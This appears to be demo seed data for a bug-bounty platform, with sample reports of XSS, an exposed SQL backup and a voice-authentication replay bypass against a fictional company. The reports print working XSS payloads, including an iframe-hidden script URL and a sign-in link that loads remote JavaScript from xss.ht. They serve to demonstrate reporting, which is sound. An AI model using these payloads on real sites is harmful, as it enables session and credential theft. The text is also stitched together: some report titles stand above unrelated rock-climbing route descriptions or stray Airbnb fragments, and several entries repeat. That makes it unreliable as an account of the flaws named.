attributes.name: Cross-site Scripting (XSS) - Reflected
attributes.description: The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.

attributes.title: Demo report: XSS in ArmorCode API sandbox home page
attributes.vulnerability_information:
In some ***fantasy world***, the home page of ArmorCode API sandbox is vulnerable to an *imaginary* Cross-Site Scripting attack.

1. Visit home page of ArmorCode API sandbox
2. Open the browser's javascript console
3. Type `alert(/xss!/)` and press enter
4. Profit!

## Impact

In our fantasy world, exploiting this vulnerability allows us to run an external script on your website that for example steals the cookies of the users that's facing the XSS and thus gaining access to the account of the victim.

attributes.title: Reflected XSS on api.playtronics.com
attributes.vulnerability_information:
The `/print.json` endpoint on the Playtronics API (`api.playtronics.com`) contains a
reflected XSS vulnerability via the `title` parameter.

### Steps to reproduce
1. Generate an API key for any user/permission on the Playtronics API
2. Send victim to an URL with the reflected XSS payload embedded:
`https://api.playtronics.com/print.json?api_key=ENTER_API_KEY_HERE&title=<script>
  alert(/xss!/);
</script>`

### Proof of Concept
It is possible to hide the reflected XSS payload inside another web page to make the
attack more stealthy. Here's a way to do it with an iframe:

```
<iframe src="https://api.playtromnics.com/print.json?api_key=ENTER_API_KEY_HERE&title=<script>
  alert(/xss!/);
</script>" />
```

### Remediaton
* Ensure the HTTP responses from the API are always `Content-Type: application/json`
* Properly sanitize the user input for the `title` parameter in the `print.json` endpoint
and escape potentially dangerous characters, such as HTML tags and JavaScript

## Impact

An attacker can execute arbitrary JavaScript on api.playtronics.com, potentially
escalating the impact by capturing the API token of the victim.

attributes.title: Reflected XSS on api.playtronics.com
attributes.vulnerability_information:
The `/print.json` endpoint on the Playtronics API (`api.playtronics.com`) contains a
reflected XSS vulnerability via the `title` parameter.

### Steps to reproduce
1. Generate an API key for any user/permission on the Playtronics API
2. Send victim to an URL with the reflected XSS payload embedded:
`https://api.playtronics.com/print.json?api_key=ENTER_API_KEY_HERE&title=<script>
  alert(/xss!/);
</script>`

### Proof of Concept
It is possible to hide the reflected XSS payload inside another web page to make the
attack more stealthy. Here's a way to do it with an iframe:

```
<iframe src="https://api.playtromnics.com/print.json?api_key=ENTER_API_KEY_HERE&title=<script>
  alert(/xss!/);
</script>" />
```

### Remediaton
* Ensure the HTTP responses from the API are always `Content-Type: application/json`
* Properly sanitize the user input for the `title` parameter in the `print.json` endpoint
and escape potentially dangerous characters, such as HTML tags and JavaScript

## Impact

An attacker can execute arbitrary JavaScript on api.playtronics.com, potentially
escalating the impact by capturing the API token of the victim.

attributes.title: Backup SQL file lingering on https://ops.playtronics.com/
attributes.vulnerability_information:
The Playtronics Ops website - `ops.playtronics.com` has a lingering SQL backup file that is
publicly accessible and downloadable. The file contains a SQL database backup that contains
privileged user information and secret keys.
# Steps to Reproduce
- Head over to https://ops.playtronics.com/tmp/backup.sql
- Inspect the raw SQL. E.g. search for `encryption_key` or `password`.
# PoC
https://ops.playtronics.com/tmp/backup.sql:
{F1107316}

# Remediation
Ensure the file is removed from the server or protected with a proper authentication mechanism
that prevents unprivileged users from accessing this sensitive information.

## Impact

Any customer of Playtronics that has this system will be
impacted by this vulnerability. An attacker could easily gain access to whatever they are
trying to protect by exploiting this vulnerability.

attributes.name: Demo Member
attributes.bio: I'm here to help test drive, and am automatically removed at launch.

attributes.name: Information Disclosure
attributes.description: An information disclosure is the intentional or unintentional disclosure of information to an actor that is not explicitly authorized to have access to that information.

attributes.content: ops.playtronics.com is serving a publicly accessible SQL file that appears to be a backup copy of the database. This file contains highly sensitive information about Playtronics users, such as password hashes and unencrypted API keys.

attributes.name: Demo Member
attributes.bio: I'm here to help test drive, and am automatically removed at launch.

attributes.title: Voice authentication bypass on Playtronics Biometric Authentication
attributes.vulnerability_information:
The Playtronics Biometric Authentication system suffers from an audio replay vulnerability.
This problem allows an attacker to bypass the authentication mechanism entirely.
# Steps to Reproduce
1. Record snippets of the person you want to impersonate. The words you need are:
*Hi. My name is [impersonated person]. My voice is my passport. Verify me.*
2. Head over to a Playtronics Biometric Authentication unit.
3. Replay the recorded snippet. When successful, the unit should display
the text `*** THANK YOU ***`.

# Proof of concept
Below is a video of me successfully bypassing the Biometric Authentication system
{F1107315}

# Remediation
Consider upgrading the system to accept a more modern form of biometric authentication,
such as iris or fingerprint scanning. If migrating off a voice-based system is not an option,
it is highly recommended to randomize the authentication string the user has to say out loud.
With a randomized phrase, an attacker will not be able to collect snippets and pre-record the
authentication string.

## Impact

Any customer of Playtronics that has deployed this biometric authentication system will be
impacted by this vulnerability. An attacker could easily gain access to whatever they are
trying to protect by exploiting this vulnerability.

attributes.title: DOM-based XSS on signin.playtronics.com
attributes.vulnerability_information:
The Playtronics Entertainment Network sign in page is vulnerable to a DOM-based
cross-site scripting (XSS) vulnerability.
### Steps to Reproduce
1. Point your victim
to https://sso.playtronics.com/signin?NextUrl=https://hackerone.com#http://xss.ht/nyancat.js
2. Wait for the victim to login with their valid Playtronics Entertainment Network credentials
3. After the victim logs in, the redirect to `https://hackerone.com` will break and an
external JS file (after the `#` is included into the DOM).

### PoC
Proof of concept using `alert()` and endless Nyan Cat loop just because I could:
{F1107314}

### Remediation
Make sure the `?NextUrl` parameter is sanitized properly before using it in the DOM.

## Impact

Since the attacker can include arbitrary (remotely hosted) JavaScript, the attacker
has full control over the DOM. For instance, they could ask the user to login again
and send off the credentials to an external server, effectively stealing login information.
Or, they can distract them with an endless Nyan Cat loop.

attributes.name: Cross-site Scripting (XSS) - Stored
attributes.description: The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.

attributes.title: XSS in signin.playtronics.com
attributes.vulnerability_information:
The Playtronics Entertainment Network sign in page is vulnerable to a DOM-based
cross-site scripting (XSS) vulnerability.
### Steps to Reproduce
1. Point your victim
to https://sso.playtronics.com/signin?NextUrl=https://hackerone.com#http://xss.ht/nyancat.js
2. Wait for the victim to login with their valid Playtronics Entertainment Network credentials
3. After the victim logs in, the redirect to `https://hackerone.com` will break and an
external JS file (after the `#` is included into the DOM).

### PoC
Proof of concept using `alert()` and endless Nyan Cat loop just because I could:

### Remediation
Make sure the `?NextUrl` parameter is sanitized properly before using it in the DOM.

## Impact

Since the attacker can include arbitrary (remotely hosted) JavaScript, the attacker
has full control over the DOM. For instance, they could ask the user to login again
and send off the credentials to an external server, effectively stealing login information.
Or, they can distract them with an endless Nyan Cat loop.

attributes.name: Cross-site Scripting (XSS) - Stored
attributes.description: The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.

100' pitch offers a little bit of everything for everyone. Featuring a bouldery start, jugs,
crack, roof, traversing, crimps, face climbing, spaced bolts and airy falls this climb has
everything you want and nothing you don't... well, maybe another bolt or two!

attributes.name: Cross-site Scripting (XSS) - Reflected
attributes.description: The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.

and other personal details, which is verified by phone call or SMS message. After this,
whenever users open the app, no login screen is ever shown again.

attributes.title: Changing details of other users profile using UUID (IDOR)
attributes.vulnerability_information:
This mega line has got to be the most striking multi-pitch route in the country, if not the
world.  It's possible to start at the very base of the tower using the Sheer Trickery
approach, but rumor has it Sheer Trickery is harder than the crux pitch of the Backbone
(and considering the fire power of the FA group - Wolfgang Gullich, Ron Kauk, and Alan Watts
- it's easy to believe).

attributes.vulnerability_information:
This route is a full 30 meter pitch with a variety of climbing styles and sections. The full
100' pitch offers a little bit of everything for everyone. Featuring a bouldery start, jugs,
crack, roof, traversing, crimps, face climbing, spaced bolts and airy falls this climb has
everything you want and nothing you don't... well, maybe another bolt or two!

attributes.title: Low entropy nonce and lack of rate limiting exposes sent offers
attributes.vulnerability_information:
While installation, Airbnb Android app asks users to enter their phone number, email address,
and other personal details, which is verified by phone call or SMS message. After this,
whenever users open the app, no login screen is ever shown again.

attributes.title: Overly verbose object serialization leaks all users' password reset tokens
attributes.vulnerability_information:
This mega line has got to be the most striking multi-pitch route in the country, if not the
world.  It's possible to start at the very base of the tower using the Sheer Trickery
approach, but rumor has it Sheer Trickery is harder than the crux pitch of the Backbone
(and considering the fire power of the FA group - Wolfgang Gullich, Ron Kauk, and Alan Watts
- it's easy to believe).
